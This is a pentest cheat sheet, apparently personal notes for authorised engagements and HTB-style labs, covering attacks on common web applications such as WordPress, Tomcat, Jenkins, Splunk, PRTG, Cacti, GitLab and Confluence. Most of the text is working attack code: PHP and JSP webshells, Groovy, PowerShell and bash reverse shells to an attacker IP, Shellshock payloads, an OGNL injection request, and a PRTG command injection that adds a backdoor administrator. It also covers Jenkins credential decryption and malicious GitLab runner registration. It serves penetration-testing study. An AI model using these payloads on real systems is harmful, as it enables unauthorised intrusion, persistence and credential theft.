# Attacking Common Applications

#WebApps #CMS #WordPress #Joomla #Drupal #Tomcat #Jenkins #Splunk #PRTG #GitLab #ColdFusion #ThickClient #Nagios #Grafana #Confluence #Exchange #Citrix #F5 #Ivanti #Fortinet #PaloAlto #ManageEngine #TeamCity #Kubernetes #Docker #Zimbra #SolarWinds #Enumeration #RCE

## What is this?

Per-application playbook for the most common web apps and services encountered during internal/external pentests. Covers enumeration, default creds, known exploit paths, and RCE techniques. For web attack primitives (SQLi, XSS, LFI, etc.) see [[SQL Injection]], [[File Inclusion]], [[Cross-Site Scripting (XSS)]]. Pairs with [[Attacking Common Services]], [[Techniques/Container Escape|Container Escape]], and the [[Methdocs/Claude/THICK-00-Overview|THICK methodology]] for thick clients.

---

## Tools

| Tool | Purpose |
|---|---|
| [[Tools/Scanning/NMAP\|nmap]] | Service discovery and version detection |
| [[Tools/Web/eyewitness\|eyewitness]] | Screenshot all web services — `eyewitness --web -f targets.txt --no-prompt` |
| [[Tools/Web/whatweb\|whatweb]] / [[Tools/Web/httpx\|httpx]] | Technology fingerprinting — `whatweb http://target` / `httpx -l hosts.txt -tech-detect -title` |
| [[Tools/Web/wpscan\|wpscan]] | WordPress enumeration and vuln scanning — `wpscan --url http://target -e ap,u` |
| [[Tools/Web/droopscan\|droopescan]] | Drupal/Joomla/SilverStripe scanning — `droopescan scan drupal -u http://target` |
| [[Tools/Web/joomscan\|joomscan]] | Joomla-specific scanner — `joomscan -u http://target` |
| [[Tools/Scanning/searchsploit\|searchsploit]] | Find known exploits for identified app versions |
| [[Tools/Payloads & Shells/metasploit\|Metasploit]] | Exploit modules for Tomcat, Jenkins, Splunk, Exchange, and others |

---

## Application Categories

| Category | Common Apps |
|---|---|
| CMS | WordPress, Joomla, Drupal, DotNetNuke |
| App Servers | Apache Tomcat, Oracle WebLogic, IBM WebSphere, JBoss, Axis2 |
| CI/CD | Jenkins, GitLab, TeamCity, Bitbucket |
| SIEM / Monitoring | Splunk, PRTG, Nagios, Grafana, Zabbix, SolarWinds Orion |
| Ticketing / ITSM | osTicket, Zendesk, ManageEngine ServiceDesk Plus |
| Dev Tools | phpMyAdmin, Confluence, Elasticsearch |
| Email | Exchange / OWA, Zimbra |
| Network / VPN Appliances | Citrix NetScaler, F5 BIG-IP, Ivanti/Pulse Secure, Palo Alto GlobalProtect, Fortinet |
| IT Management | ManageEngine (ADManager, ADSelfService, Desktop Central, OpManager) |
| Container / Orchestration | Docker API, Kubernetes, Portainer |
| Thick Clients | .NET/Java/C++ desktop apps |

---

## Recon Workflow

```bash
# Nmap — find web services
nmap -sV -sC -p 80,443,8000,8080,8443,8888 10.10.10.10
nmap -sV --script=http-title,http-headers 10.10.10.0/24

# Visual recon — screenshot all discovered web services
eyewitness --web -f targets.txt --no-prompt -d eyewitness_out
cat scope.txt | aquatone -out aquatone_out

# Tech fingerprinting
whatweb http://10.10.10.10
httpx -l hosts.txt -tech-detect -title -status-code
```

> [!note]
> EyeWitness and Aquatone output lets you quickly spot default installs, login pages, and unprotected admin panels across large target lists without clicking through every host manually.

---

## WordPress

### Enumeration

```bash
# Version — multiple sources
curl -s http://target.com/ | grep 'WordPress'
curl -s http://target.com/wp-login.php | grep 'ver='
curl -s http://target.com/readme.html | grep -i version

# wpscan — full enum (users, plugins, themes, vulns)
wpscan --url http://target.com --enumerate u,ap,at,tt,cb,dbe --plugins-detection aggressive
wpscan --url http://target.com -e u --passwords /usr/share/wordlists/rockyou.txt

# Interesting paths
/wp-login.php           # admin login
/xmlrpc.php             # XML-RPC API (brute force / SSRF)
/wp-content/uploads/    # uploaded files
/wp-content/plugins/    # installed plugins
/wp-content/themes/     # installed themes
/wp-json/wp/v2/users    # user enumeration via REST API (unauthenticated)
```

### Attacking

```bash
# Brute force login
wpscan --url http://target.com -U admin -P /usr/share/wordlists/rockyou.txt

# XML-RPC brute force (bypasses lockout on some configs)
wpscan --url http://target.com --password-attack xmlrpc -U admin -P /usr/share/wordlists/rockyou.txt
```

**RCE via Theme Editor (authenticated admin):**
1. Appearance → Theme Editor → select an inactive theme → edit `404.php`
2. Insert PHP webshell: `<?php system($_GET['cmd']); ?>`
3. Navigate to `http://target.com/wp-content/themes/<theme>/404.php?cmd=id`

**RCE via Plugin Upload (authenticated admin):**

```bash
# Metasploit
use exploit/unix/webapp/wp_admin_shell_upload
set RHOSTS target.com
set USERNAME admin
set PASSWORD Password123
run
```

**Plugin-specific vulns:**

```bash
# mail-masta — LFI (unauthenticated)
curl -s 'http://target.com/wp-content/plugins/mail-masta/inc/campaign/count_of_send.php?pl=/etc/passwd'

# wpDiscuz 7.0.4 — unauthenticated RCE (CVE-2020-24186)
python3 wp_discuz.py -u http://target.com -p /?p=1
# https://www.exploit-db.com/exploits/49967
```

---

## Joomla

### Enumeration

```bash
# Version
curl -s http://target.com/README.txt | head -n 5
curl -s http://target.com/administrator/manifests/files/joomla.xml | grep '<version>'

# Automated scanners
droopescan scan joomla --url http://target.com/
joomscan -u http://target.com                 # OWASP joomscan (Perl; Kali package)
python2.7 joomlascan.py -u http://target.com  # drego85 JoomlaScan — older alt

# Interesting paths
/administrator             # admin login
/configuration.php         # config (not directly readable but look for backups)
/htaccess.txt
/web.config.txt
/LICENSE.txt
```

### Attacking

```bash
# Brute force admin login
# https://github.com/ajnik/joomla-bruteforce — pass the site root; the script appends /administrator/
python3 joomla-brute.py -u http://target.com -w /usr/share/wordlists/rockyou.txt -usr admin
# -U users.txt instead of -usr for a user list (mutually exclusive); -p http://127.0.0.1:8080 to proxy via Burp
```

**RCE via Template Editor (authenticated admin):**
1. Extensions → Templates → Templates → select a template
2. Edit any `.php` file (e.g., `error.php`)
3. Insert: `system($_GET['dcfdd5e021a869fcc6dfaef8bf31377e']);`
4. Preview: `http://target.com/templates/<template>/error.php?dcfdd5e021a869fcc6dfaef8bf31377e=id`

**CVEs:**
- CVE-2023-23752 — Unauthenticated information disclosure (config data including DB creds) — Joomla 4.0.0–4.2.7
  ```bash
  curl 'http://target.com/api/index.php/v1/config/application?public=true'
  ```

---

## Drupal

### Enumeration

```bash
# Version
curl -s http://target.com/CHANGELOG.txt | head -5
curl -s http://target.com/core/CHANGELOG.txt | head -5    # Drupal 8+
droopescan scan drupal -u http://target.com

# Interesting paths
/user/login            # login
/admin                 # admin panel
/node/1                # first node — sometimes reveals version
/?q=user/login         # older Drupal URL format
```

### Attacking

**PHP Filter module — RCE (Drupal 7, module must be enabled):**

```bash
# If PHP filter is enabled — add PHP code directly to a node
# Navigate to: Modules → PHP filter → enable
# Content → Add content → Basic page → set text format to "PHP code"
# Body: <?php system($_GET['cmd']); ?>
# Access: http://target.com/node/<id>?cmd=id

# If PHP filter missing (Drupal 8+) — install it manually
wget https://ftp.drupal.org/files/projects/php-8.x-1.1.tar.gz
```

**RCE via Custom Module upload:**

```bash
# Download a legit module to use as a wrapper
wget --no-check-certificate https://ftp.drupal.org/files/projects/captcha-8.x-1.2.tar.gz
tar xvf captcha-8.x-1.2.tar.gz

# Create shell and .htaccess inside module dir
echo '<?php system($_GET["fe8edbabc5c5c9b7b764504cd22b17af"]); ?>' > captcha/shell.php
cat > captcha/.htaccess << 'EOF'
<IfModule mod_rewrite.c>
RewriteEngine On
RewriteBase /
</IfModule>
EOF

# Repack and upload via admin
tar cvf captcha.tar.gz captcha/
# Extend → Install new module → upload captcha.tar.gz

# Trigger shell
curl 'http://target.com/modules/captcha/shell.php?fe8edbabc5c5c9b7b764504cd22b17af=id'
```

**drush — Drupal CLI (post-shell on server):**

```bash
# If you have a shell on the server and Drupal is installed, drush gives DB-level control

# Reset admin password (common post-shell escalation)
drush user-password admin "newpass123"
drush upwd admin --password="newpass123"   # older drush syntax

# Enable PHP filter module (needed for PHP code execution via node)
drush en php -y

# List users
drush uinf --uid=1

# Full path if drush not in $PATH
/var/www/html/vendor/drush/drush/drush user-password admin "newpass123"
```

**CVEs (Drupalgeddon):**
- Drupalgeddon (SA-CORE-2014-005 / CVE-2014-3704) — SQLi → RCE — Drupal 7.0–7.31
- Drupalgeddon2 (CVE-2018-7600) — Unauthenticated RCE — Drupal < 7.58, 8.3.x < 8.3.9, 8.4.x < 8.4.6, 8.5.x < 8.5.1
- Drupalgeddon3 (CVE-2018-7602) — Authenticated RCE (needs node-delete rights) — Drupal 7.x < 7.59, 8.4.x < 8.4.8, 8.5.x < 8.5.3

```bash
# Drupalgeddon2
python3 drupalgeddon2.py http://target.com
```

---

## Apache Tomcat

### Enumeration

```bash
# Version fingerprint
curl -s http://target.com:8080/docs/ | grep Tomcat
# 404/500 error pages often leak version

# Nmap
nmap -sV -p 8080,8443,8009 target.com

# Dir brute — find manager
gobuster dir -u http://target.com:8080 -w /usr/share/wordlists/dirbuster/directory-list-2.3-small.txt

# Manager login paths
/manager/html              # GUI manager
/manager/text              # text-based manager (used by scripts)
/host-manager/html
```

**Default credentials:** `tomcat:tomcat` | `admin:admin` | `admin:password` | `tomcat:s3cret`

```bash
# MSF — brute force manager creds
use auxiliary/scanner/http/tomcat_mgr_login
set RHOSTS 10.10.10.10
set RPORT 8080
set STOP_ON_SUCCESS true
run

# Script alt — https://github.com/b33lz3bub-1/Tomcat-Manager-Bruteforce (needs termcolor)
# All four flags required, case-sensitive: -U base URL, -P manager/ or host-manager/, -u users file, -p passwords file
python3 mgr_brute.py -U http://target.com:8080/ -P manager/ \
  -u /usr/share/metasploit-framework/data/wordlists/tomcat_mgr_default_users.txt \
  -p /usr/share/metasploit-framework/data/wordlists/tomcat_mgr_default_pass.txt
```

### Attacking

**WAR file upload → webshell (authenticated manager):**

```bash
# Option 1 — JSP webshell
wget https://raw.githubusercontent.com/tennc/webshell/master/fuzzdb-webshell/jsp/cmd.jsp
zip -r shell.war cmd.jsp
# Upload via /manager/html → WAR file to deploy
# Access: http://target.com:8080/shell/cmd.jsp?cmd=id
```

**WAR file upload → reverse shell:**

```bash
# Option 2 — msfvenom reverse shell WAR
msfvenom -p java/jsp_shell_reverse_tcp LHOST=10.10.14.5 LPORT=9001 -f war -o shell.war
nc -lvnp 9001
# Upload via manager → access http://target.com:8080/shell/

# Option 3 — MSF module (with valid creds)
use exploit/multi/http/tomcat_mgr_upload
set RHOSTS 10.10.10.10
set HttpUsername tomcat
set HttpPassword tomcat
run
```

**WAR deploy via curl (no browser needed):**

> [!note] `/manager/text` needs the **`manager-script`** role; `/manager/html` needs **`manager-gui`**. Creds that work in the GUI can 403 on the text endpoint (and vice versa) — check the roles in `tomcat-users.xml`.

```bash
# Deploy using /manager/text endpoint — fully scriptable
curl -u tomcat:tomcat "http://target.com:8080/manager/text/deploy?path=/shell&update=true" --upload-file shell.war
# Access: http://target.com:8080/shell/

# Undeploy
curl -u tomcat:tomcat "http://target.com:8080/manager/text/undeploy?path=/shell"
```

**CVE-2020-1938 — Ghostcat (AJP LFI):**

```bash
# AJP connector on port 8009 — reads arbitrary webapp files
# Affected: Tomcat 6 (all), 7 < 7.0.100, 8.5 < 8.5.51, 9 < 9.0.31
python2.7 tomcat-ajp.lfi.py target.com -p 8009 -f WEB-INF/web.xml
# https://github.com/YDHCUI/CNVD-2020-10487-Tomcat-Ajp-lfi
# Read web.xml for creds → pivot to manager upload
```

**CVE-2025-24813 — Partial PUT deserialization RCE (unauthenticated, actively exploited):**

```bash
# Affects Tomcat 11.0.0-M1–11.0.2 (fixed 11.0.3), 10.1.0-M1–10.1.34 (fixed 10.1.35),
# 9.0.0.M1–9.0.98 (fixed 9.0.99), and EOL 8.5.0–8.5.100.
# Conditions: default servlet writes enabled (readonly=false — NOT the default)
# AND partial PUT on (default) AND file-based session persistence
# (PersistentManager + FileStore, default location) AND a deserialization
# gadget library on the classpath. No manager creds needed.

# Mechanism: a partial PUT to /X/session (or /X.session) is staged in the work dir
# as ".X.session" ('/' → '.'); a request with Cookie: JSESSIONID=.X makes FileStore
# load and deserialize it.

# 1. Test the write primitive first — 201/204 means PUT is enabled
curl -s -o /dev/null -w '%{http_code}\n' -X PUT http://target.com:8080/test.txt --data 'x'

# 2. Exploit with Metasploit (set RPORT yourself — module default is 443 with SSL off)
use exploit/multi/http/tomcat_partial_put_deserialization
set RHOSTS 10.10.10.10
set RPORT 8080
set GADGET CommonsBeanutils1     # default; change to match the target's classpath
run
```

> [!warning]
> CVE-2025-24813 is on CISA KEV (exploitation seen from March 2025). The `readonly=false` + file-session-store precondition is uncommon, so a failed PUT test rules it out quickly.

### Key File Locations

| Path | Purpose |
|---|---|
| `conf/tomcat-users.xml` | Cleartext manager credentials |
| `conf/server.xml` | Connector config, ports, AJP settings |
| `webapps/` | Default webroot — deployed apps live here |
| `webapps/ROOT/WEB-INF/web.xml` | App deployment descriptor |
| `logs/catalina.out` | Main log — version, errors, stack traces |

---

## Jenkins

### Enumeration

```bash
# Default ports: 8080 (web), 50000 (inbound TCP agent / JNLP — HTB Academy says 5000, the real default is 50000)
# Auth: local DB / LDAP / AD / none
# No shipped default creds — setup wizard uses a one-time password in
#   /var/lib/jenkins/secrets/initialAdminPassword (Linux) — admin accounts are often still weak (admin:admin is worth a try)

# Interesting URLs
/asynchPeople/            # user enumeration (no auth on some versions)
/systemInfo               # system info (requires auth)
/script                   # Groovy Script Console — direct RCE if accessible
/credentials/             # stored credentials
/manage                   # management console
```

### Attacking

**Groovy Script Console RCE — Linux:**

```groovy
// Execute command
def cmd = 'id'
def sout = new StringBuffer(), serr = new StringBuffer()
def proc = cmd.execute()
proc.consumeProcessOutput(sout, serr)
proc.waitForOrKill(1000)
println sout
```

**Groovy Script Console RCE — Linux reverse shell:**

```groovy
r = Runtime.getRuntime()
p = r.exec(["/bin/bash", "-c", "exec 5<>/dev/tcp/10.10.14.5/9001;cat <&5 | while read line; do \$line 2>&5 >&5; done"] as String[])
p.waitFor()
```

**Groovy Script Console RCE — Windows:**

```groovy
// Run command
def cmd = "cmd.exe /c whoami"
def proc = cmd.execute()
println proc.text
```

**Groovy Script Console RCE — Windows reverse shell:**

```groovy
String host = "10.10.14.5"
int port = 9001
String cmd = "cmd.exe"
Process p = new ProcessBuilder(cmd).redirectErrorStream(true).start()
Socket s = new Socket(host, port)
InputStream pi = p.getInputStream(), pe = p.getErrorStream(), si = s.getInputStream()
OutputStream po = p.getOutputStream(), so = s.getOutputStream()
while (!s.isClosed()) {
    while (pi.available() > 0) so.write(pi.read())
    while (pe.available() > 0) so.write(pe.read())
    while (si.available() > 0) po.write(si.read())
    so.flush(); po.flush()
    Thread.sleep(50)
    try { p.exitValue(); break } catch (Exception e) {}
}
p.destroy(); s.close()
```

**CVE-2025-53652 — Git Parameter plugin command injection:**

- Advisory SECURITY-3419 (2025-07-09): Git Parameter plugin ≤ `439.vb_0e46ca_14534` doesn't check that the submitted value is one of the offered choices; fixed in **`444.vca_b_84d3703c2`**.
- Needs **Item/Build** permission on a job that uses a Git Parameter. That's only unauthenticated if anonymous users have Build.
- Jenkins rates it Medium "value injection". VulnCheck showed the unchecked value reaches shell commands the git client runs during the build, so `$(...)` in the value executes on the controller/agent.
- The build POST needs a session cookie **and** a CSRF crumb (`/crumbIssuer/api/json`) even on anonymous instances.
- Write-up: https://www.vulncheck.com/blog/git-parameter-rce

**Decrypt stored credentials (Script Console):** `/credentials/` shows secrets masked, but the console can decrypt them:

```groovy
// Decrypt a single {AQAAABAAAA...} blob copied from credentials.xml / config.xml
println(hudson.util.Secret.decrypt("{AQAAABAAAA...}"))
```

Offline alternative: copy `secrets/master.key`, `secrets/hudson.util.Secret` and `credentials.xml` from `$JENKINS_HOME` and decrypt off-box.

> [!note]
> If `/script` requires auth, check for CVE-2024-23897 (arbitrary file read via the CLI `@file` argument expansion — Jenkins ≤ 2.441 / LTS ≤ 2.426.2) or older unauthenticated RCE CVEs. Also check stored credentials at `/credentials/` — these often contain SSH keys, API tokens, or domain creds.

---

## Splunk

### Enumeration

```bash
# Default ports: 8000 (web), 8089 (management/REST API), 9997 (forwarder)
# Free license = no auth required
# URL: http://target.com:8000/en-US/account/login

# REST API check (no auth on some deployments)
curl -k https://target.com:8089/services/server/info
```

### Attacking

**RCE via Custom App (authenticated):**

```bash
# Use pre-built reverse shell app
git clone https://github.com/0xjpuff/reverse_shell_splunk
# Edit bin/run.ps1 (Windows, launched by run.bat) or bin/rev.py (Linux) with your LHOST/LPORT
# default/inputs.conf holds the scripted-input stanzas — keep only the one matching the target OS

# Package and upload
tar -cvzf splunk_shell.tar.gz reverse_shell_splunk/
# Apps → Manage Apps → Install app from file → upload .tar.gz
# Start your listener before uploading — shell fires on install
```

**Windows payload (`bin/run.ps1`):**

```powershell
$client = New-Object System.Net.Sockets.TCPClient('10.10.14.5', 9001)
$stream = $client.GetStream()
[byte[]]$bytes = 0..65535|%{0}
while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){
    $data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0,$i)
    $sendback = (iex $data 2>&1 | Out-String)
    $sendback2 = $sendback + 'PS ' + (pwd).Path + '> '
    $sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2)
    $stream.Write($sendbyte,0,$sendbyte.Length)
    $stream.Flush()
}
$client.Close()
```

**Splunk Universal Forwarder — management port RCE (port 8089):**

```bash
# Older UFs (< 7.1) shipped admin:changeme; 7.1+ has no default password, so weak/reused creds are the way in
# (the SplunkWhisperer2 README notes the default changeme password doesn't work remotely)
nmap -p 8089 target.com

# Verify access
curl -sk -u admin:changeme https://target.com:8089/services/server/info

# PySplunkWhisperer2 — builds an app, serves it over HTTP, and has the UF install it
git clone https://github.com/cnotin/SplunkWhisperer2
cd SplunkWhisperer2/PySplunkWhisperer2
python3 PySplunkWhisperer2_remote.py --host target.com --port 8089 \
  --username admin --password '<pass>' \
  --lhost 10.10.14.5 --lport 8001 \
  --payload-file pwn.sh --payload '<command>'
# --lport = the HTTP port the UF downloads the app from (default 8181), NOT a shell listener
# --payload = literal contents of bin/<payload-file>, run as a scripted input
# Defaults (pwn.bat / calc.exe) target Windows — set both for Linux. Press RETURN to remove _PWN_APP_.
```

> [!note]
> Splunk forwarder agents running on servers also accept app deployments if you have management port access. Even without the web UI, a compromised forwarder = RCE on that host.

---

## PRTG Network Monitor

### Enumeration

```bash
# Default ports: 80, 443, 8080
# Default creds: prtgadmin:prtgadmin
# Admin path: http://target.com/index.htm
```

### Attacking

**CVE-2018-9276 — Authenticated RCE via notification command injection:**

```bash
# Setup → Account Settings → Notifications → Add new notification
# Set trigger: execute program
# Parameter field — inject command:
# test.txt;net user prtgbackdoor Password123! /add;net localgroup administrators prtgbackdoor /add

# Then trigger the notification via sensor alert or manual trigger
```

**Default credential check + version:**

```bash
# Check for config backup containing old creds
# Windows path: C:\ProgramData\Paessler\PRTG Network Monitor\
# File: PRTG Configuration.old.bak — often has cleartext credentials
```

> [!note]
> The config backup file `PRTG Configuration.old.bak` is a goldmine — it frequently contains the previous admin password in cleartext, and admins often increment it by 1 digit when prompted to change it.

---

## Cacti

Open-source network graphing/monitoring (PHP + MySQL). Frequently served under a `/cacti/` sub-path on its own vhost.

### Enumeration

```bash
# Version is in the login-page footer, CHANGELOG, or include/cacti_version
curl -s http://cacti.target.htb/cacti/CHANGELOG | head
# Default cred worth a try: admin:admin (forces a change on first login)
# App path matters: login redirects to …/cacti/ — real paths are /cacti/index.php etc.
```

### Attacking

**CVE-2022-46169 — Unauthenticated command injection (Cacti ≤ 1.2.22, fixed 1.2.23 / 1.3.0):**

- `remote_agent.php` trusts `X-Forwarded-For` for its "is this a poller?" check, so a spoofed `127.0.0.1` passes the check.
- The `poller_id` parameter of `action=polldata` then reaches `proc_open()` unsanitized.
- It only fires if a poller item with a PHP-script action exists (e.g. "Device - Uptime"). `host_id` / `local_data_ids` have to be brute-forced.

```bash
use exploit/linux/http/cacti_unauthenticated_cmd_injection
set RHOSTS 10.10.10.10
set TARGETURI /cacti/          # match the real app path
set LHOST tun0
run
# Options: X_FORWARDED_FOR_IP (default 127.0.0.1), HOST_ID, LOCAL_DATA_ID to skip the brute force
```

**CVE-2024-25641 — Authenticated arbitrary file write → RCE (Cacti ≤ 1.2.26, fixed 1.2.27):**

The **Package Import** feature (Console → Import/Export → Import Packages) writes bundled files to disk without constraining path/extension, so a `.php` file smuggled inside the package lands in the webroot and executes as the web user.

```bash
# Needs a user with the "Import Templates" permission (crack/reuse the admin hash first).
# Package = XML bundle of files + a signature; the importer validates the sig
# against a key embedded IN the package → a self-signed package passes.
# D3Ext PoC (https://github.com/D3Ext/CVE-2024-25641) — all flags required except --verbose; start nc first
python3 exploit.py --url http://cacti.target.htb --user admin --password <pw> \
        --lhost <tun0> --lport 9001            # → reverse shell as www-data
# Metasploit alt: exploit/multi/http/cacti_package_import_rce

# Payload lands in the webroot's resource dir, triggered by GET:
#   http://cacti.target.htb/cacti/resource/<rand>.php
```

> [!warning] **The importer is racy.** The 2-step import references the PHP upload temp (`/tmp/phpXXXX`), which is deleted after the preview request; if the confirm POST loses the race the payload 404s. **Just re-run** until it lands. Also: the app is often under `/cacti/` — a PoC that hits the bare host writes/triggers the wrong paths (derive the base from the post-login redirect).

> [!note] The signature "check" is **presence-only** — it validates against a key *inside the package you supplied*, not a trusted one, so a self-signed package is accepted. Same class as [[Exploits/Signature Verification Bypass|Signature Verification Bypass]] (CWE-347).

**Post-RCE looting** — Cacti keeps its DB creds in `include/config.php` (`$database_username`/`$database_password`, often `cactiuser:cactiuser`); that DB's `user_auth` table holds the bcrypt hashes for every Cacti user (crack → password reuse to a system account). Read it as the web user before pivoting.

---

## osTicket

### Enumeration

```bash
# PHP-based ticketing system — Apache or IIS, MySQL backend
# Cookie: OSTSESSID
# Version: usually on the login page footer or /scp/admin.php

# Interesting paths
/scp/login.php       # staff/admin login
/scp/admin.php       # admin panel (requires admin role)
/open.php            # submit a new ticket (often public)
```

### Attacking

```bash
# Check for CVEs — searchsploit
searchsploit osticket

# Create an account and submit tickets
# Look for: file upload → webshell, email injection, info disclosure in ticket responses
# Staff portal may reveal internal email addresses → use for password spray
```

> [!note]
> osTicket integrations often pull email — check if you can find email credentials in the config, or if the ticket system reveals internal usernames/email formats useful for AD spraying.

---

## GitLab

### Enumeration

```bash
# Default port: 80/443
# Version: http://target.com/help → shows version once logged in (register a user first if sign-up is open)
# Public projects: http://target.com/explore/projects?visibility=public

# User enumeration via sign-up (username taken = different response)
# API: http://target.com/api/v4/users?per_page=100 (if public API enabled)
```

### Attacking

```bash
# Register an account → browse public repos for secrets
# Search for: password, secret, key, token, .env, id_rsa

# Check CVEs for your version — GitLab has had critical RCE vulns
searchsploit gitlab

# Notable CVEs
# CVE-2021-22205 — Unauthenticated RCE via image parsing (ExifTool, chained with CVE-2021-22204)
#   Affected: 11.9 ≤ v < 13.8.8, 13.9 < 13.9.6, 13.10 < 13.10.3
# CVE-2023-7028 — Account takeover: password-reset email also sent to an attacker-supplied address
#   Affected: 16.1 < 16.1.6, 16.2 < 16.2.9, 16.3 < 16.3.7, 16.4 < 16.4.5, 16.5 < 16.5.6, 16.6 < 16.6.4, 16.7 < 16.7.2
```

```bash
# CVE-2021-22205 — https://github.com/inspiringz/CVE-2021-22205 (positional argv, no argparse)
python3 CVE-2021-22205.py -u http://target.com/ -m detect
python3 CVE-2021-22205.py -u http://target.com/ -m rev 10.10.14.5 9001
# Metasploit alt: exploit/multi/http/gitlab_exif_rce

# CVE-2023-7028 — Metasploit (sets TARGETEMAIL = victim, MYEMAIL = yours)
use auxiliary/admin/http/gitlab_password_reset_account_takeover
```

### GitLab Runner Token Abuse

If you gain shell on a GitLab server or CI runner host, runner tokens allow registering a malicious runner that executes arbitrary commands in pipeline jobs.

```bash
# Runner token stored in config file on the runner host
cat /etc/gitlab-runner/config.toml
# Look for: token = "glrt-..."

# Register a runner YOU control (on your box) against the target GitLab
# (legacy registration token from Settings → CI/CD → Runners; deprecated in newer GitLab,
#  which instead issues glrt- auth tokens from the UI and takes `--token glrt-...`)
gitlab-runner register \
  --non-interactive \
  --url http://target.com \
  --registration-token <reg_token> \
  --executor shell \
  --description "attacker-runner"

# After registration — the runner executes all matching pipeline jobs as the OS user
# Add a .gitlab-ci.yml to any project using this runner:
# job:
#   script:
#     - bash -i >& /dev/tcp/10.10.14.5/9001 0>&1
```

> [!note] Runner tokens found in `config.toml` are *authentication* tokens — they allow the runner to poll for jobs. Registration tokens (from the UI) are needed to register new runners. Both are valuable: auth tokens let you impersonate the runner and receive pipeline jobs.

---

## Atlassian Confluence

### Enumeration

```bash
# Default ports: 8090 (Confluence), 8091 (Synchrony). Often behind 80/443 reverse proxy.
# Version — footer of any page, or the meta tag / REST API (no auth on many installs):
curl -s http://target/confluence/ | grep -oiE 'confluence[^<]{0,30}'
curl -s http://target/rest/applinks/1.0/manifest        # version in the manifest XML
curl -s http://target/login.action                       # login page footer shows build
# Interesting paths
#   /setup/setupadministrator.action   (CVE-2023-22515 access-control)
#   /pages/createpage-entervariables.action  (CVE-2021-26084 sink)
```

### Attacking

Confluence Server/Data Center has a string of **unauthenticated RCEs** — version-check first, they map cleanly to CVEs.

```bash
# CVE-2022-26134 — OGNL injection, UNAUTH RCE (all versions < 7.4.17 / 7.13.7 / 7.14.3 /
# 7.15.2 / 7.16.4 / 7.17.4 / 7.18.1). The OGNL expression rides in the URL PATH.
# ⚠ UNVERIFIED payload (2026-10-07 audit could not source-check it) — test in a lab first,
#   or use the module instead: msfconsole -q -x 'search cve:2022-26134'
curl -s -o /dev/null -w '%{http_code}\n' \
  "http://target/%24%7B%28%23a%3D%40org.apache.commons.io.IOUtils%40toString%28%40java.lang.Runtime%40getRuntime%28%29.exec%28%22id%22%29.getInputStream%28%29%2C%22utf-8%22%29%29.%28%40com.opensymphony.webwork.ServletActionContext%40getResponse%28%29.setHeader%28%22X-Cmd%22%2C%23a%29%29%7D/"
# Command output comes back in the X-Cmd response header. Decoded, the payload is:
#   ${(#a=@...IOUtils@toString(@...Runtime@getRuntime().exec("id")...)).(setHeader("X-Cmd",#a))}
# Use the published PoC for a stable reverse shell rather than hand-URL-encoding each command.

# CVE-2021-26084 — Velocity-template OGNL injection, pre-auth RCE on most installs
# (< 6.13.23 / 7.4.11 / 7.11.6 / 7.12.5). Sink: POST /pages/createpage-entervariables.action
#   queryString=aaaa'%2b#{...OGNL...}%2b'
# (Not the Widget Connector bug — that's the older CVE-2019-3396.)

# CVE-2023-22527 — template injection, UNAUTH RCE (8.0.x – 8.5.3)
#   msfconsole: search cve:2023-22527

# CVE-2023-22515 — Broken access control (8.0.0–8.5.1). Not RCE: re-opens setup mode and
# lets you CREATE AN ADMIN account, then log in and RCE via a malicious app/macro.
#   POST /server-info.action?bootstrapStatusProvider.applicationConfig.setupComplete=false
#   then hit /setup/setupadministrator.action to add your admin user
```

> [!note] Post-admin RCE on any Confluence: **install a malicious app** (Manage apps → Upload app, an OBR/JAR plugin with a webshell) or add a **user macro** that runs Java/Velocity — the same "authenticated admin → code" pattern as Tomcat manager / Jenkins script console. Also loot `confluence.cfg.xml` and the DB for the `hibernate.connection.password` and integration creds.

---

## Tomcat CGI

### Overview

CGI (Common Gateway Interface) lets Tomcat pass requests to external scripts (Bash, Python, Perl, C). Usually found at `/cgi-bin/`.

### Enumeration

```bash
# Scan for CGI scripts
ffuf -w /usr/share/seclists/Discovery/Web-Content/CGIs.txt -u http://target.com/cgi-bin/FUZZ
nmap --script http-shellshock --script-args uri=/cgi-bin/status target.com
```

### Attacking

**Command injection (Windows — CGI parameter):**

```http
GET /cgi-bin/welcome.bat?&c%3A%5Cwindows%5Csystem32%5Cwhoami.exe HTTP/1.1
```

**Shellshock (CVE-2014-6271) — Bash CGI scripts:**

```bash
# Test
curl -H "User-Agent: () { :; }; echo; echo vulnerable" http://target.com/cgi-bin/status

# Reverse shell
curl -H "User-Agent: () { :; }; /bin/bash -i >& /dev/tcp/10.10.14.5/9001 0>&1" http://target.com/cgi-bin/status
```

---

## ColdFusion

### Enumeration

| Port | Protocol | Purpose |
|---|---|---|
| 80 | HTTP | Web |
| 443 | HTTPS | Web (SSL) |
| 8500 | HTTP/HTTPS | ColdFusion admin (sometimes) |
| 1935 | RPC | RPC protocol |
| 5500 | CF Monitor | Remote admin |

```bash
# Fingerprint
curl -s http://target.com/ | grep -i coldfusion
curl -s http://target.com/CFIDE/administrator   # admin portal
# File extensions: .cfm, .cfc
# Headers: X-Powered-By: ColdFusion
```

> [!note] ColdFusion often runs on IIS, so pair it with [[#IIS Tilde (8.3 Short Name) Enumeration]].

### Attacking

```bash
# Known CVEs — check version first
searchsploit coldfusion

# CVE-2010-2861 — Directory traversal → admin hash disclosure
curl 'http://target.com/CFIDE/administrator/enter.cfm?locale=../../../../../../ColdFusion8/lib/password.properties%00en'

# CVE-2009-2265 — Unauthenticated FCKeditor file upload → RCE (CF8)
searchsploit -m 50057        # EDB 50057 — edit lhost/lport/rhost/rport in the script, then run
```

---

## IIS Tilde (8.3 Short Name) Enumeration

IIS leaks the 8.3 short-name prefix of files/dirs (e.g. `TRANSF~1.ASP`), so you can brute-force the full name from a 6-character head start. It's not specific to any app — check every IIS host.

```bash
# Enumerate 8.3 short filenames on IIS
java -jar iis_shortname_scanner.jar 0 5 http://target.com/
# https://github.com/irsdl/IIS-ShortName-Scanner
# Go alternative: https://github.com/bitquark/shortscan  →  shortscan http://target.com/

# Build wordlist from discovered prefix (e.g. "transf")
grep -rh "^transf" /usr/share/seclists/Discovery/Web-Content/ > /tmp/transf_words.txt

# Brute force full filename
gobuster dir -u http://target.com/ -w /tmp/transf_words.txt -x .aspx,.asp
```

---

## Thick Clients

### Overview

- **2-tier:** app communicates directly with DB
- **3-tier:** app → server → DB (more common)
- Languages: C++, Java, .NET, Electron
- Goal: find creds in memory/disk, intercept traffic, find injectable params

